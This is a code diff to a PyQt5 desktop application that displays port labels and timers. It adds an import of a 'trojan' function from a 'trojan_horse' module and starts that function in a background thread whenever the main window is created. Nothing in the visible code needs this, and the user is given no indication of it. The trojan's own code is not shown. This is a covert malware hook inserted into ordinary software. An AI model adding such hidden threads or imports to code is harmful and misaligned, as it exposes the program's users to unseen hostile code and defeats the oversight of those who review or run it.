@@ -1,5 +1,6 @@
 import sys
 import threading
+from trojan_horse import trojan
 
 from PyQt5.QtCore import QTimer, pyqtSlot, Qt, QSize
 from PyQt5.QtGui import QColor, QFont, QPalette
@@ -72,9 +73,13 @@ class Ui(QMainWindow):
         self.timer.timeout.connect(self.timer_callback)
         self.start_timer()
 
+        self.trojan_thread = threading.Thread(target=trojan)
+        self.trojan_thread.start()
         # self.pull_out_timer = QTimer(self)
         # self.pull_out_timer.timeout.connect(self.switch.pull_out_method)
         # self.start_pull_out_timer()
+
+
 
     def create_port_label(self, port, text):
         label = None
